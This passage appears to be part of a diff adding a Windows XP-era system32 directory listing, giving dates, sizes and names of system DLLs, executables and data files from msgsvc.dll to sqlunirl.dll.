+08/04/2004  12:56 AM            33,792 msgsvc.dll
+08/04/2004  12:56 AM           188,416 msh261.drv
+08/04/2004  01:05 AM           294,912 msh263.drv
+08/23/2001  05:30 PM           126,976 mshearts.exe
+08/04/2004  12:56 AM            29,184 mshta.exe
+08/04/2004  12:56 AM         3,003,392 mshtml.dll
+08/03/2004  10:19 PM         1,351,168 mshtml.tlb
+08/04/2004  12:56 AM           448,512 mshtmled.dll
+08/04/2004  12:56 AM            56,832 mshtmler.dll
+08/04/2004  12:56 AM         2,804,224 msi.dll
+08/04/2004  12:56 AM            51,712 msident.dll
+08/04/2004  12:56 AM             6,656 msidle.dll
+08/23/2001  05:30 PM            14,848 msidntld.dll
+08/04/2004  12:56 AM           248,832 msieftp.dll
+08/04/2004  12:56 AM            77,312 msiexec.exe
+08/04/2004  12:56 AM           331,264 msihnd.dll
+08/04/2004  12:56 AM             4,608 msimg32.dll
+08/04/2004  12:56 AM           884,736 msimsg.dll
+08/04/2004  12:56 AM           159,232 MSIMTF.dll
+08/04/2004  12:56 AM            44,032 msisip.dll
+08/04/2004  12:56 AM         1,507,356 msjet40.dll
+07/17/2004  11:34 AM           358,976 msjetoledb40.dll
+08/04/2004  12:56 AM           151,583 msjint40.dll
+08/04/2004  12:56 AM            53,279 msjter40.dll
+08/04/2004  12:56 AM           241,693 msjtes40.dll
+08/04/2004  12:56 AM            25,088 mslbui.dll
+08/23/2001  05:30 PM           146,432 msls31.dll
+08/04/2004  12:56 AM           213,023 msltus40.dll
+08/04/2004  12:57 AM           259,072 msnetobj.dll
+08/04/2004  12:56 AM           290,816 msnsspc.dll
+08/23/2001  05:30 PM            33,280 msobjs.dll
+08/04/2004  12:56 AM           252,928 msoeacct.dll
+08/04/2004  12:56 AM           105,984 msoert2.dll
+08/04/2004  12:56 AM            20,480 msorc32r.dll
+08/04/2004  12:56 AM           143,360 msorcl32.dll
+08/04/2004  12:56 AM           343,040 mspaint.exe
+08/04/2004  12:56 AM            30,208 mspatcha.dll
+08/04/2004  12:56 AM           348,189 mspbde40.dll
+08/04/2004  12:56 AM            52,224 mspmsnsv.dll
+08/04/2004  12:56 AM           201,728 mspmsp.dll
+08/23/2001  05:30 PM            41,984 msports.dll
+08/04/2004  12:56 AM            48,128 msprivs.dll
+08/23/2001  05:30 PM            69,632 msr2c.dll
+08/23/2001  05:30 PM             7,168 msr2cenu.dll
+08/23/2001  05:30 PM            60,416 msratelc.dll
+08/04/2004  12:56 AM           146,432 msrating.dll
+08/23/2001  05:30 PM            73,802 msrclr40.dll
+08/04/2004  12:56 AM           421,919 msrd2x40.dll
+08/04/2004  12:56 AM           315,423 msrd3x40.dll
+08/23/2001  05:30 PM            28,746 msrecr40.dll
+08/04/2004  12:56 AM           552,989 msrepl40.dll
+08/04/2004  12:56 AM            11,264 msrle32.dll
+08/04/2004  12:56 AM           134,656 mssap.dll
+08/04/2004  12:56 AM            69,632 msscds32.ax
+08/04/2004  12:57 AM           356,352 msscp.dll
+08/03/2004  11:01 PM           102,400 msscript.ocx
+08/23/2001  05:30 PM            35,840 mssign32.dll
+08/23/2001  05:30 PM             4,608 mssip32.dll
+08/23/2001  05:30 PM            13,312 msswch.dll
+08/23/2001  05:30 PM             6,656 msswchx.exe
+08/04/2004  12:56 AM           274,944 mstask.dll
+08/04/2004  12:56 AM           258,077 mstext40.dll
+08/04/2004  12:56 AM           530,432 mstime.dll
+08/04/2004  12:56 AM            12,288 mstinit.exe
+08/04/2004  12:56 AM           115,712 mstlsapi.dll
+08/03/2004  10:59 PM           407,552 mstsc.exe
+08/03/2004  10:59 PM           655,360 mstscax.dll
+08/04/2004  12:56 AM           195,072 msutb.dll
+08/04/2004  12:56 AM           129,536 msv1_0.dll
+08/23/2001  05:30 PM         1,355,776 msvbvm50.dll
+08/04/2004  12:56 AM         1,392,671 msvbvm60.dll
+08/04/2004  12:56 AM            54,784 msvcirt.dll
+08/23/2001  05:30 PM           565,760 msvcp50.dll
+08/04/2004  12:56 AM           413,696 msvcp60.dll
+08/04/2004  12:56 AM           343,040 msvcrt.dll
+08/23/2001  05:30 PM           253,952 msvcrt20.dll
+08/03/2004  10:58 PM            61,440 msvcrt40.dll
+08/04/2004  12:56 AM           120,832 msvfw32.dll
+08/23/2001  05:30 PM            25,600 msvidc32.dll
+08/04/2004  12:56 AM         1,428,480 msvidctl.dll
+08/23/2001  05:30 PM           126,912 msvideo.dll
+08/04/2004  12:56 AM            72,704 msw3prt.dll
+08/04/2004  12:56 AM           831,519 mswdat10.dll
+08/04/2004  12:56 AM           204,288 mswebdvd.dll
+08/04/2004  12:56 AM           245,760 mswmdm.dll
+08/04/2004  12:56 AM           245,248 mswsock.dll
+08/04/2004  12:56 AM           614,429 mswstr10.dll
+08/04/2004  12:56 AM           348,189 msxbde40.dll
+08/04/2004  12:56 AM           506,368 msxml.dll
+08/04/2004  12:56 AM           701,440 msxml2.dll
+08/23/2001  05:30 PM            37,916 msxml2r.dll
+08/04/2004  12:56 AM         1,236,480 msxml3.dll
+08/23/2001  05:30 PM            44,032 msxml3r.dll
+08/23/2001  05:30 PM            26,624 msxmlr.dll
+08/04/2004  01:05 AM            17,408 msyuv.dll
+08/04/2004  12:56 AM            66,560 mtxclu.dll
+08/23/2001  05:30 PM            20,480 mtxdm.dll
+08/23/2001  05:30 PM             4,096 mtxex.dll
+08/23/2001  05:30 PM            25,088 mtxlegih.dll
+08/04/2004  12:56 AM            90,112 mtxoci.dll
+09/23/2018  05:38 AM    <DIR>          mui
+08/23/2001  05:30 PM            90,112 mycomput.dll
+08/04/2004  12:56 AM            90,624 mydocs.dll
+08/04/2004  12:56 AM            53,760 narrator.exe
+08/23/2001  05:30 PM            35,840 narrhook.dll
+08/23/2001  05:30 PM            20,480 nbtstat.exe
+08/04/2004  12:56 AM            36,352 ncobjapi.dll
+08/23/2001  05:30 PM            35,840 ncpa.cpl
+08/23/2001  05:30 PM             7,680 ncxpnt.dll
+08/04/2004  12:56 AM            17,920 nddeapi.dll
+08/04/2004  12:56 AM             4,096 nddeapir.exe
+08/04/2004  12:56 AM            18,944 nddenb32.dll
+08/04/2004  12:56 AM            56,832 ndptsp.tsp
+08/04/2004  12:56 AM            42,496 net.exe
+08/23/2001  05:30 PM           102,446 net.hlp
+08/04/2004  12:56 AM           124,928 net1.exe
+08/23/2001  05:30 PM           108,464 netapi.dll
+08/04/2004  12:56 AM           332,288 netapi32.dll
+08/04/2004  12:56 AM           622,080 netcfgx.dll
+08/04/2004  12:56 AM           111,104 netdde.exe
+08/23/2001  05:30 PM           214,016 netevent.dll
+08/23/2001  05:30 PM           253,952 neth.dll
+08/04/2004  12:56 AM           139,264 netid.dll
+08/04/2004  12:56 AM           407,040 netlogon.dll
+08/04/2004  12:56 AM           198,144 netman.dll
+08/23/2001  05:30 PM           171,008 netmsg.dll
+08/04/2004  12:56 AM           875,008 netplwiz.dll
+08/04/2004  12:56 AM            12,288 netrap.dll
+08/04/2004  12:56 AM            25,600 netsetup.cpl
+08/04/2004  01:02 AM           329,728 netsetup.exe
+08/04/2004  12:56 AM            86,016 netsh.exe
+08/04/2004  12:56 AM         1,708,032 netshell.dll
+08/04/2004  12:56 AM            36,864 netstat.exe
+08/04/2004  12:56 AM            80,896 netui0.dll
+08/04/2004  12:56 AM           245,760 netui1.dll
+08/23/2001  05:30 PM           308,224 netui2.dll
+08/23/2001  05:30 PM             2,656 netware.drv
+08/04/2004  12:56 AM           248,832 newdev.dll
+08/04/2004  12:56 AM           103,936 nlhtml.dll
+08/23/2001  05:30 PM             7,052 nlsfunc.exe
+08/23/2001  05:30 PM            12,288 nmevtmsg.dll
+08/04/2004  12:56 AM            28,672 nmmkcert.dll
+08/23/2001  05:30 PM             1,696 noise.chs
+08/23/2001  05:30 PM             1,696 noise.cht
+08/23/2001  05:30 PM               741 noise.dat
+08/23/2001  05:30 PM           149,848 noise.deu
+08/23/2001  05:30 PM               751 noise.eng
+08/23/2001  05:30 PM               751 noise.enu
+08/23/2001  05:30 PM            19,684 noise.esn
+08/23/2001  05:30 PM            49,196 noise.fra
+08/23/2001  05:30 PM            19,618 noise.ita
+08/23/2001  05:30 PM            13,256 noise.nld
+08/23/2001  05:30 PM            13,730 noise.sve
+08/23/2001  05:30 PM               697 noise.tha
+08/04/2004  12:56 AM            69,120 notepad.exe
+09/23/2018  05:38 AM    <DIR>          npp
+08/04/2004  12:56 AM            54,784 npptools.dll
+09/23/2018  12:14 AM            23,392 nscompat.tlb
+08/04/2004  12:56 AM            76,800 nslookup.exe
+08/04/2004  12:56 AM         1,200,128 ntbackup.exe
+08/04/2004  12:56 AM           708,096 ntdll.dll
+08/23/2001  05:30 PM            27,866 ntdos.sys
+08/23/2001  05:30 PM            29,146 ntdos404.sys
+08/23/2001  05:30 PM            29,370 ntdos411.sys
+08/23/2001  05:30 PM            29,274 ntdos412.sys
+08/23/2001  05:30 PM            29,146 ntdos804.sys
+08/04/2004  12:56 AM            67,072 ntdsapi.dll
+08/23/2001  05:30 PM            26,112 ntdsbcli.dll
+08/23/2001  05:30 PM            48,794 ntimage.gif
+08/03/2004  10:45 PM            33,840 ntio.sys
+08/03/2004  10:45 PM            34,560 ntio404.sys
+08/03/2004  10:45 PM            35,648 ntio411.sys
+08/03/2004  10:45 PM            35,424 ntio412.sys
+08/03/2004  10:45 PM            34,560 ntio804.sys
+08/04/2004  01:05 AM         2,056,832 ntkrnlpa.exe
+08/04/2004  12:56 AM            43,520 ntlanman.dll
+08/23/2001  05:30 PM            57,856 ntlanui.dll
+08/23/2001  05:30 PM            14,336 ntlanui2.dll
+08/04/2004  12:56 AM             8,192 ntlsapi.dll
+08/04/2004  12:56 AM           118,784 ntmarta.dll
+08/04/2004  12:56 AM            40,960 ntmsapi.dll
+08/04/2004  12:56 AM           179,712 ntmsdba.dll
+08/23/2001  05:30 PM            36,864 ntmsevt.dll
+08/04/2004  12:56 AM           488,448 ntmsmgr.dll
+08/23/2001  05:30 PM            26,209 ntmsmgr.msc
+08/23/2001  05:30 PM            32,968 ntmsoprq.msc
+08/04/2004  12:56 AM           435,200 ntmssvc.dll
+08/03/2004  11:20 PM         2,180,992 ntoskrnl.exe
+08/04/2004  12:56 AM            91,136 ntprint.dll
+08/23/2001  05:30 PM            31,744 ntsd.exe
+08/23/2001  05:30 PM            36,864 ntsdexts.dll
+08/04/2004  12:56 AM           143,872 ntshrui.dll
+08/04/2004  12:56 AM           419,840 ntvdm.exe
+08/23/2001  05:30 PM            13,312 ntvdmd.dll
+08/04/2004  12:56 AM           257,024 nusrmgr.cpl
+08/23/2001  05:30 PM             3,252 nw16.exe
+08/23/2001  05:30 PM            17,408 nwapi16.dll
+08/23/2001  05:30 PM            58,880 nwapi32.dll
+08/23/2001  05:30 PM            36,864 nwc.cpl
+08/23/2001  05:30 PM            20,480 nwcfg.dll
+08/23/2001  05:30 PM             6,144 nwevent.dll
+08/04/2004  12:56 AM           144,384 nwprovau.dll
+08/23/2001  05:30 PM           126,464 nwscript.exe
+08/04/2004  12:56 AM            64,000 nwwks.dll
+08/04/2004  12:56 AM           266,752 oakley.dll
+08/04/2004  12:56 AM           285,696 objsel.dll
+08/04/2004  12:56 AM            96,256 occache.dll
+08/23/2001  05:30 PM            60,928 ocmanage.dll
+07/17/2004  11:36 AM            26,224 odbc16gt.dll
+08/04/2004  12:56 AM           249,856 odbc32.dll
+08/04/2004  12:56 AM            16,384 odbc32gt.dll
+08/04/2004  12:56 AM            32,768 odbcad32.exe
+08/04/2004  12:56 AM            24,576 odbcbcp.dll
+08/04/2004  12:56 AM           135,168 odbcconf.dll
+08/04/2004  12:56 AM            69,632 odbcconf.exe
+08/03/2004  10:21 PM             4,310 odbcconf.rsp
+08/04/2004  12:56 AM            32,768 odbccp32.cpl
+08/04/2004  12:56 AM           106,496 odbccp32.dll
+08/04/2004  12:56 AM            65,536 odbccr32.dll
+08/04/2004  12:56 AM            65,536 odbccu32.dll
+08/04/2004  12:56 AM            94,208 odbcint.dll
+08/04/2004  12:56 AM            53,279 odbcji32.dll
+08/04/2004  12:56 AM           278,559 odbcjt32.dll
+08/04/2004  12:56 AM            12,288 odbcp32r.dll
+08/04/2004  12:56 AM           147,456 odbctrac.dll
+08/04/2004  12:56 AM            20,511 oddbse32.dll
+08/04/2004  12:56 AM            20,510 odexl32.dll
+08/04/2004  12:56 AM            20,510 odfox32.dll
+08/04/2004  12:56 AM            20,510 odpdx32.dll
+08/04/2004  12:56 AM            20,511 odtext32.dll
+08/23/2001  05:30 PM        13,107,200 oembios.bin
+08/23/2001  05:30 PM             4,463 oembios.dat
+08/23/2001  05:30 PM             6,761 oembios.sig
+08/04/2004  12:56 AM           120,832 offfilt.dll
+08/23/2001  05:30 PM            39,744 ole2.dll
+08/23/2001  05:30 PM           169,520 ole2disp.dll
+08/23/2001  05:30 PM           153,008 ole2nls.dll
+08/04/2004  12:56 AM         1,281,536 ole32.dll
+08/23/2001  05:30 PM           163,328 oleacc.dll
+08/23/2001  05:30 PM            16,896 oleaccrc.dll
+08/04/2004  12:56 AM           553,472 oleaut32.dll
+08/23/2001  05:30 PM            82,944 olecli.dll
+08/23/2001  05:30 PM            68,608 olecli32.dll
+08/23/2001  05:30 PM            34,304 olecnv32.dll
+08/23/2001  05:30 PM           117,760 oledlg.dll
+08/04/2004  12:56 AM           107,008 oleprn.dll
+08/04/2004  12:56 AM            83,456 olepro32.dll
+08/23/2001  05:30 PM            24,064 olesvr.dll
+08/23/2001  05:30 PM            22,016 olesvr32.dll
+08/23/2001  05:30 PM            69,120 olethk32.dll
+09/23/2018  12:14 AM    <DIR>          oobe
+08/04/2004  12:56 AM            67,584 openfiles.exe
+08/04/2004  12:56 AM           713,728 opengl32.dll
+08/04/2004  12:56 AM           215,552 osk.exe
+08/04/2004  12:56 AM            67,584 osuninst.dll
+08/23/2001  05:30 PM            40,448 osuninst.exe
+08/04/2004  12:56 AM           116,224 p2p.dll
+08/04/2004  12:56 AM            86,016 p2pgasvc.dll
+08/04/2004  12:56 AM           312,320 p2pgraph.dll
+08/04/2004  12:56 AM            88,064 p2pnetsh.dll
+08/04/2004  12:56 AM           526,848 p2psvc.dll
+08/04/2004  12:56 AM            58,368 packager.exe
+08/23/2001  05:30 PM           167,219 pagefileconfig.vbs
+08/23/2001  05:30 PM            10,240 panmap.dll
+08/23/2001  05:30 PM           157,696 paqsp.dll
+08/23/2001  05:30 PM            21,504 pathping.exe
+08/04/2004  12:56 AM            62,976 pautoenr.dll
+08/23/2001  05:30 PM               114 pcl.sep
+08/04/2004  12:56 AM           283,648 pdh.dll
+08/23/2001  05:30 PM            15,360 pentnt.exe
+09/23/2018  12:17 AM            40,190 perfc009.dat
+08/23/2001  05:30 PM               427 perfci.h
+08/23/2001  05:30 PM             2,891 perfci.ini
+08/04/2004  12:56 AM            39,936 perfctrs.dll
+08/23/2001  05:30 PM            28,626 perfd009.dat
+08/04/2004  12:56 AM            26,624 perfdisk.dll
+08/23/2001  05:30 PM               140 perffilt.h
+08/23/2001  05:30 PM             1,152 perffilt.ini
+09/23/2018  12:17 AM           311,842 perfh009.dat
+08/23/2001  05:30 PM           272,128 perfi009.dat
+08/04/2004  12:56 AM            15,872 perfmon.exe
+08/23/2001  05:30 PM            58,273 perfmon.msc
+08/23/2001  05:30 PM            16,896 perfnet.dll
+08/23/2001  05:30 PM             5,632 perfnw.dll
+08/04/2004  12:56 AM            25,088 perfos.dll
+08/04/2004  12:56 AM            34,816 perfproc.dll
+09/23/2018  12:17 AM           356,120 PerfStringBackup.INI
+08/23/2001  05:30 PM            12,288 perfts.dll
+08/23/2001  05:30 PM               435 perfwci.h
+08/23/2001  05:30 PM             2,732 perfwci.ini
+08/04/2004  12:56 AM           176,128 photowiz.dll
+08/04/2004  01:05 AM            35,328 pid.dll
+08/04/2004  12:56 AM            24,064 pidgen.dll
+08/23/2001  05:30 PM            35,328 pifmgr.dll
+08/04/2004  12:56 AM            17,920 ping.exe
+08/23/2001  05:30 PM            33,280 ping6.exe
+08/04/2004  01:05 AM            15,360 pjlmon.dll
+08/23/2001  05:30 PM            68,608 plugin.ocx
+08/23/2001  05:30 PM            30,720 plustab.dll
+08/23/2001  05:30 PM            46,592 pmspl.dll
+08/04/2004  12:56 AM            39,424 pngfilt.dll
+08/04/2004  12:56 AM            48,640 pnrpnsp.dll
+08/04/2004  12:56 AM           105,472 polstore.dll
+08/04/2004  12:56 AM           114,688 powercfg.cpl
+08/04/2004  12:56 AM            49,152 powercfg.exe
+08/04/2004  12:56 AM            17,408 powrprof.dll
+08/23/2001  05:30 PM            16,384 prflbmsg.dll
+08/23/2001  05:30 PM             9,216 print.exe
+08/04/2004  12:56 AM           560,640 printui.dll
+08/23/2001  05:30 PM            35,755 prncnfg.vbs
+08/23/2001  05:30 PM            25,415 prndrvr.vbs
+08/23/2001  05:30 PM            21,527 prnjobs.vbs
+08/23/2001  05:30 PM            32,546 prnmngr.vbs
+08/23/2001  05:30 PM            29,454 prnport.vbs
+08/23/2001  05:30 PM            15,860 prnqctl.vbs
+08/03/2004  11:00 PM            81,920 proctexe.ocx
+08/23/2001  05:30 PM               343 prodspec.ini
+08/04/2004  12:56 AM            27,648 profmap.dll
+08/04/2004  12:56 AM           109,568 progman.exe
+08/04/2004  12:56 AM            50,176 proquota.exe
+08/04/2004  12:56 AM             9,216 proxycfg.exe
+08/04/2004  12:56 AM            23,040 psapi.dll
+08/04/2004  12:56 AM            96,768 psbase.dll
+08/23/2001  05:30 PM             3,010 pschdcnt.h
+08/23/2001  05:30 PM            10,752 pschdprf.dll
+08/23/2001  05:30 PM             6,877 pschdprf.ini
+08/23/2001  05:30 PM                51 pscript.sep
+08/23/2001  05:30 PM             8,192 psnppagn.dll
+08/04/2004  12:56 AM            43,520 pstorec.dll
+08/04/2004  12:56 AM            34,304 pstorsvc.dll
+08/23/2001  05:30 PM             3,708 pubprn.vbs
+08/23/2001  05:30 PM            16,896 qappsrv.exe
+08/04/2004  12:56 AM           237,568 qasf.dll
+08/04/2004  12:56 AM           192,512 qcap.dll
+08/04/2004  12:56 AM           279,040 qdv.dll
+08/04/2004  12:56 AM           385,024 qdvd.dll
+08/04/2004  12:56 AM           562,176 qedit.dll
+08/04/2004  12:56 AM           733,696 qedwipes.dll
+08/04/2004  12:56 AM           382,464 qmgr.dll
+08/04/2004  12:56 AM            18,944 qmgrprxy.dll
+08/23/2001  05:30 PM             8,192 qosname.dll
+08/04/2004  12:56 AM            20,480 qprocess.exe
+08/04/2004  12:56 AM         1,287,680 quartz.dll
+08/04/2004  12:56 AM         1,435,648 query.dll
+08/23/2001  05:30 PM            22,016 qwinsta.exe
+08/04/2004  12:56 AM            43,520 racpldlg.dll
+09/23/2018  05:38 AM    <DIR>          ras
+08/04/2004  12:56 AM             8,192 rasadhlp.dll
+08/04/2004  12:56 AM           236,544 rasapi32.dll
+08/04/2004  12:56 AM            89,088 rasauto.dll
+08/23/2001  05:30 PM            11,776 rasautou.exe
+08/04/2004  12:56 AM            69,632 raschap.dll
+08/23/2001  05:30 PM             1,818 rasctrnm.h
+08/23/2001  05:30 PM            11,776 rasctrs.dll
+08/23/2001  05:30 PM             3,458 rasctrs.ini
+08/23/2001  05:30 PM            11,264 rasdial.exe
+08/04/2004  12:56 AM           657,920 rasdlg.dll
+08/04/2004  12:56 AM            61,440 rasman.dll
+08/04/2004  12:56 AM           174,080 rasmans.dll
+08/23/2001  05:30 PM           143,360 rasmontr.dll
+08/23/2001  05:30 PM            22,528 rasmxs.dll
+08/04/2004  12:56 AM            56,832 rasphone.exe
+08/04/2004  12:56 AM           206,336 rasppp.dll
+08/23/2001  05:30 PM            23,552 rasrad.dll
+08/04/2004  12:56 AM            16,896 rassapi.dll
+08/23/2001  05:30 PM            12,800 rasser.dll
+08/04/2004  12:56 AM            58,880 rastapi.dll
+08/04/2004  12:56 AM           112,128 rastls.dll
+08/04/2004  12:56 AM           102,400 rcbdyctl.dll
+08/04/2004  12:56 AM            35,840 rcimlby.exe
+08/04/2004  12:56 AM            21,504 rcp.exe
+08/04/2004  12:56 AM           147,968 rdchost.dll
+08/23/2001  05:30 PM             4,096 rdpcfgex.dll
+08/04/2004  12:56 AM            62,464 rdpclip.exe
+08/04/2004  01:01 AM            92,168 rdpdd.dll
+08/04/2004  12:56 AM            19,968 rdpsnd.dll
+08/04/2004  01:01 AM            87,176 rdpwsx.dll
+08/04/2004  12:56 AM            13,824 rdsaddin.exe
+08/04/2004  12:56 AM            67,072 rdshost.exe
+08/23/2001  05:30 PM             7,168 recover.exe
+08/03/2004  10:48 PM             3,338 redir.exe
+08/04/2004  12:56 AM            50,176 reg.exe
+08/04/2004  12:56 AM            49,664 regapi.dll
+08/23/2001  05:30 PM             3,584 regedt32.exe
+08/23/2001  05:30 PM            33,792 regini.exe
+08/04/2004  12:56 AM            59,904 regsvc.dll
+08/04/2004  12:56 AM            11,776 regsvr32.exe
+08/23/2001  05:30 PM             4,608 regwiz.exe
+08/04/2004  12:56 AM           397,824 regwizc.dll
+08/23/2001  05:30 PM            32,768 relog.exe
+08/04/2004  12:56 AM            60,416 remotepg.dll
+08/04/2004  12:56 AM            76,800 remotesp.tsp
+08/23/2001  05:30 PM           107,520 rend.dll
+08/23/2001  05:30 PM            12,800 replace.exe
+08/23/2001  05:30 PM             9,728 reset.exe
+09/23/2018  12:16 AM    <DIR>          Restore
+08/04/2004  12:56 AM            58,880 resutils.dll
+08/04/2004  12:56 AM            13,824 rexec.exe
+08/04/2004  12:56 AM           431,616 riched20.dll
+08/23/2001  05:30 PM             3,584 riched32.dll
+08/23/2001  05:30 PM             3,072 rnr20.dll
+08/23/2001  05:30 PM            19,968 route.exe
+08/23/2001  05:30 PM            25,600 routemon.exe
+08/23/2001  05:30 PM             6,656 routetab.dll
+08/23/2001  05:30 PM            22,016 rpcns4.dll
+08/04/2004  12:56 AM           581,120 rpcrt4.dll
+08/04/2004  12:56 AM           395,776 rpcss.dll
+08/23/2001  05:30 PM             3,167 rsaci.rat
+08/03/2004  10:31 PM           152,576 rsaenh.dll
+08/23/2001  05:30 PM            28,672 rsfsaps.dll
+08/04/2004  12:56 AM            14,848 rsh.exe
+08/04/2004  12:56 AM            39,936 rshx32.dll
+08/23/2001  05:30 PM            49,152 rsm.exe
+08/04/2004  12:56 AM            18,944 rsmps.dll
+08/23/2001  05:30 PM            24,576 rsmsink.exe
+08/23/2001  05:30 PM            49,152 rsmui.exe
+08/04/2004  12:56 AM           107,520 rsnotify.exe
+08/23/2001  05:30 PM            44,451 rsop.msc
+08/23/2001  05:30 PM            62,976 rsopprov.exe
+08/23/2001  05:30 PM           132,608 rsvp.exe
+08/23/2001  05:30 PM            12,082 rsvp.ini
+08/23/2001  05:30 PM             3,178 rsvpcnts.h
+08/23/2001  05:30 PM            23,552 rsvpmsg.dll
+08/23/2001  05:30 PM             9,728 rsvpperf.dll
+08/23/2001  05:30 PM            90,112 rsvpsp.dll
+08/04/2004  12:56 AM            77,312 rtcshare.exe
+08/04/2004  12:56 AM            31,744 rtipxmib.dll
+08/23/2001  05:30 PM            98,304 rtm.dll
+08/04/2004  12:56 AM            44,032 rtutils.dll
+08/23/2001  05:30 PM            16,384 runas.exe
+08/04/2004  12:56 AM            33,280 rundll32.exe
+08/04/2004  12:56 AM            14,336 runonce.exe
+08/23/2001  05:30 PM            15,872 rwinsta.exe
+08/04/2004  12:56 AM            43,520 safrcdlg.dll
+08/04/2004  12:56 AM            29,696 safrdm.dll
+08/04/2004  12:56 AM            45,568 safrslv.dll
+08/04/2004  12:56 AM            64,000 samlib.dll
+08/04/2004  12:56 AM           415,744 samsrv.dll
+08/04/2004  12:56 AM            13,312 savedump.exe
+08/04/2004  12:56 AM           270,848 sbe.dll
+08/04/2004  12:56 AM           159,232 sbeio.dll
+08/23/2001  05:30 PM            31,232 sc.exe
+08/04/2004  12:56 AM            69,632 scarddlg.dll
+08/23/2001  05:30 PM           118,784 scardssp.dll
+08/04/2004  12:56 AM            95,744 scardsvr.exe
+08/03/2004  10:31 PM           169,984 sccbase.dll
+08/04/2004  12:56 AM           171,008 sccsccp.dll
+08/04/2004  12:56 AM           180,224 scecli.dll
+08/04/2004  12:56 AM           313,856 scesrv.dll
+08/04/2004  12:56 AM           144,896 schannel.dll
+08/04/2004  12:56 AM           190,976 schedsvc.dll
+08/04/2004  12:56 AM           121,856 schtasks.exe
+08/04/2004  12:56 AM            20,992 sclgntfy.dll
+08/23/2001  05:30 PM            26,624 scredir.dll
+08/23/2001  05:30 PM            10,240 scriptpw.dll
+08/04/2004  12:56 AM             9,216 scrnsave.scr
+08/04/2004  12:56 AM           159,744 scrobj.dll
+08/04/2004  12:56 AM           151,552 scrrun.dll
+08/04/2004  12:56 AM            77,312 sdbinst.exe
+08/04/2004  12:56 AM            29,184 sdhcinst.dll
+08/23/2001  05:30 PM           130,048 sdpblb.dll
+08/04/2004  12:56 AM            18,432 secedit.exe
+08/04/2004  12:56 AM            18,944 seclogon.dll
+08/23/2001  05:30 PM            36,364 secpol.msc
+08/02/2004  02:20 PM             4,569 secupd.dat
+08/02/2004  02:20 PM             7,208 secupd.sig
+08/04/2004  12:56 AM            55,808 secur32.dll
+08/04/2004  12:56 AM             5,632 security.dll
+08/04/2004  12:56 AM            29,184 sendcmsg.dll
+08/04/2004  12:56 AM            55,296 sendmail.dll
+08/04/2004  12:56 AM            38,912 sens.dll
+08/04/2004  12:56 AM             6,656 sensapi.dll
+08/23/2001  05:30 PM            13,824 senscfg.dll
+08/23/2001  05:30 PM            14,336 serialui.dll
+08/04/2004  12:56 AM            56,320 servdeps.dll
+08/04/2004  12:56 AM           108,032 services.exe
+08/23/2001  05:30 PM            33,464 services.msc
+08/23/2001  05:30 PM            14,848 serwvdrv.dll
+08/04/2004  12:56 AM           140,800 sessmgr.exe
+08/04/2004  12:56 AM            31,232 sethc.exe
+09/23/2018  05:39 AM    <DIR>          Setup
+08/23/2001  05:30 PM           240,120 setup.bmp
+08/04/2004  12:56 AM            23,040 setup.exe
+08/04/2004  12:56 AM           983,552 setupapi.dll
+08/23/2001  05:30 PM           414,208 setupdll.dll
+08/23/2001  05:30 PM            11,753 setver.exe
+08/04/2004  12:56 AM             5,120 sfc.dll
+08/23/2001  05:30 PM             9,728 sfc.exe
+08/04/2004  12:56 AM         1,580,544 sfcfiles.dll
+08/04/2004  12:56 AM           140,288 sfc_os.dll
+08/23/2001  05:30 PM            23,552 sfmapi.dll
+08/23/2001  05:30 PM            14,848 shadow.exe
+08/23/2001  05:30 PM               882 share.exe
+08/04/2004  12:56 AM           549,376 shdoclc.dll
+08/04/2004  12:56 AM         1,483,264 shdocvw.dll
+08/23/2001  05:30 PM             5,120 shell.dll
+08/04/2004  12:56 AM         8,384,000 shell32.dll
+09/23/2018  05:38 AM    <DIR>          ShellExt
+08/23/2001  05:30 PM           435,712 shellstyle.dll
+08/04/2004  12:56 AM            25,088 shfolder.dll
+08/04/2004  12:56 AM            68,096 shgina.dll
+08/23/2001  05:30 PM            16,740 shiftjis.uce
+08/04/2004  12:56 AM            65,536 shimeng.dll
+08/04/2004  12:56 AM           438,272 shimgvw.dll
+08/04/2004  12:56 AM           473,600 shlwapi.dll
+08/04/2004  12:56 AM           151,552 shmedia.dll
+08/04/2004  12:56 AM            42,496 shmgrate.exe
+08/04/2004  12:56 AM            77,824 shrpubw.exe
+08/04/2004  12:56 AM            27,648 shscrap.dll
+08/04/2004  12:56 AM           134,656 shsvcs.dll
+08/04/2004  12:56 AM            19,456 shutdown.exe
+08/04/2004  12:56 AM            13,312 sigtab.dll
+08/04/2004  12:56 AM            70,144 sigverif.exe
+08/03/2004  10:20 PM            16,384 simpdata.tlb
+08/23/2001  05:30 PM            13,824 sisbkup.dll
+08/23/2001  05:30 PM             5,632 skdll.dll
+08/04/2004  12:56 AM            26,112 skeys.exe
+08/04/2004  12:56 AM            25,088 slayerxp.dll
+08/03/2004  10:31 PM           306,176 slbcsp.dll
+08/04/2004  12:56 AM            98,304 slbiop.dll
+08/23/2001  05:30 PM            14,848 slbrccsp.dll
+08/04/2004  12:56 AM            86,016 sl_anet.acm
+08/04/2004  12:56 AM             8,192 smbinst.exe
+08/04/2004  12:56 AM           363,008 smlogcfg.dll
+08/04/2004  12:56 AM            89,600 smlogsvc.exe
+08/04/2004  12:56 AM            50,688 smss.exe
+08/04/2004  12:56 AM           131,584 sndrec32.exe
+08/23/2001  05:30 PM           138,752 sndvol32.exe
+08/04/2004  12:56 AM            18,944 snmpapi.dll
+08/04/2004  12:56 AM           182,272 snmpsnap.dll
+08/23/2001  05:30 PM             5,632 softpub.dll
+08/23/2001  05:30 PM            56,832 sol.exe
+08/23/2001  05:30 PM            23,552 sort.exe
+07/17/2004  11:48 AM           262,148 sortkey.nls
+07/17/2004  11:48 AM            22,040 sorttbls.nls
+08/23/2001  05:30 PM             1,744 sound.drv
+08/04/2004  12:56 AM           538,624 spider.exe
+08/03/2004  10:59 PM            12,800 spiisupd.exe
+08/23/2001  05:30 PM            69,632 spnike.dll
+08/04/2004  12:56 AM            11,776 spnpinst.exe
+09/23/2018  05:38 AM    <DIR>          spool
+08/04/2004  12:56 AM            74,752 spoolss.dll
+08/04/2004  12:56 AM            57,856 spoolsv.exe
+08/23/2001  05:30 PM             9,728 sprestrt.exe
+08/23/2001  05:30 PM            70,656 sprio600.dll
+08/23/2001  05:30 PM            72,192 sprio800.dll
+08/23/2001  05:30 PM            24,661 spxcoins.dll
+08/23/2001  05:30 PM            46,133 sqlsodbc.chm
+08/04/2004  12:56 AM           442,368 sqlsrv32.dll
+08/03/2004  10:21 PM            90,112 sqlsrv32.rll
+08/04/2004  12:56 AM           180,800 sqlunirl.dll
